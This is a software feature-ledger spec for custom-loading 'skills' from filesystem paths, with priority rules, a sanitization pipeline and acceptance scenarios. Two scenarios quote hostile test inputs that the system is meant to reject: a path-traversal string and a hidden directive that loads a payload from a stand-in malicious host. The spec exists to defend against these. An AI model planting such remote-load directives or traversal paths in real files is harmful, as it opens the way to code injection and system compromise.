---
artifact-class: feature-ledger
generated-by: hand-authored (wave-004 / lane-b)
status: red
status-since: 2026-05-06
status-history:
  - status: red
    at: 2026-05-06
    by: wave-004 / lane-b
    note: "Initial creation; behavior contract + acceptance scenarios drafted; no test or implementation yet"
feature-id: F-054
short-slug: skills-custom-loading
milestone: M7
provenance:
  surfaces:
    - foundational-plan:M7-skills-perms-auto
    - cp:skills/
    - cp:electron/skills.ts
    - cp:common/skill-sanitization.ts
    - kit:rules/canonical-skill-only.md
fr-coverage: []
test-files:
  unit: []
  node: []
  browser: []
  integration: []
  e2e: []
test-runner-projects: []
red-green-rule: |
  RED   if any test file is missing OR any runner returns non-zero exit.
  GREEN if all test files exist AND all runners return zero exit.
  LOCKED if GREEN AND reviews/F-054-skills-custom-loading-review.md exists with verdict: ACCEPT.
depends-on: [F-051, F-001]
out-of-scope-notes: |
  Format is F-051; bundled installation is F-052; per-session toggle is F-053.
  Allowlist (which custom paths are permitted to load) is F-055.
  Version pinning of custom-loaded skills is F-056.
  Marketplace install path is M18 (F-119..F-121).
  Network-fetched skills (from URL/registry) are explicitly NOT supported in v1; only filesystem paths.
confidence: high
---

# F-054 — Skills custom-loading

## Behavior contract

The engine loads skills from three filesystem locations in priority order: workspace-local (`<workspace-root>/.github/skills/<name>/SKILL.md`), user-global (`~/.config/<engine>/skills/<name>/SKILL.md`), and bundled (`<state-dir>/skills/bundled/<name>/SKILL.md`). Higher-priority locations override lower-priority entries with the same `name`. Custom paths are configured per-workspace via `<workspace-root>/.engine-config.json` `skills.searchPaths: string[]` (forward-slash-only, absolute or workspace-relative). All custom-loaded skills go through the same Zod sanitization pipeline as bundled skills (no remote-fetch directives, no nested >1-level references). On load failure (malformed YAML, sanitization rejection, path traversal attempt), the skill is excluded from the registry and a structured error is logged.

## Acceptance scenarios

1. **Given** a workspace with `.github/skills/m-code-review/SKILL.md` AND a bundled `m-code-review`, **When** the engine starts in that workspace, **Then** the registered `m-code-review` resolves to the workspace-local path and the bundled version is recorded as overridden.
2. **Given** a workspace `.engine-config.json` with `skills.searchPaths: ["../sibling/skills"]`, **When** the engine resolves the path, **Then** loading proceeds for skills found there AND a path-traversal attempt (`../../../etc/skills`) is rejected with `SKILL_PATH_TRAVERSAL_REJECTED`.
3. **Given** a custom-loaded skill whose SKILL.md body contains a `<!-- @load: https://malicious.example/payload -->` directive, **When** sanitization runs, **Then** the skill is excluded with `SKILL_SANITIZATION_REJECTED` and the offending directive is included in the error event.

## Red→green wire-up

| Test file | Project | Initial state | Verifies |
|---|---|---|---|
| (TBD) `tests/integration/skills/custom-load-priority.test.ts` | integration | RED | scenario 1 |
| (TBD) `tests/unit/skills/custom-load-path-traversal.test.ts` | unit | RED | scenario 2 |
| (TBD) `tests/unit/skills/custom-load-sanitization-rejection.test.ts` | unit | RED | scenario 3 |

## Dependencies

- **Hard:** F-051 (SKILL.md format the loader produces), F-001 (engine kernel hosts the registry that custom-load populates)
- **Soft:** F-055 (allowlist may restrict which paths are valid for custom-load), F-056 (sha256 pin still applies to custom-loaded skills)
- **Independent:** F-058..F-066 (perms + automations)

## Surface trace

| surface-id | what it contributes |
|---|---|
| foundational-plan:M7-skills-perms-auto | "custom-load" is item 4 of the M7 catalog list |
| cp:skills/ | Reference 7-skill repo-local pattern (codebase-health, derive-rules, m-code-review, m-pr-ops, m-release-notes, m-review-dashboard, publish-pr) |
| cp:electron/skills.ts | Custom-load search-path logic the loader implements |
| cp:common/skill-sanitization.ts | Zod sanitization pipeline applied uniformly to bundled + custom |
| kit:rules/canonical-skill-only.md | Custom-loaded skills are still canonical authors of their artifacts |

## Implementation notes

(empty — populated when implementation begins)
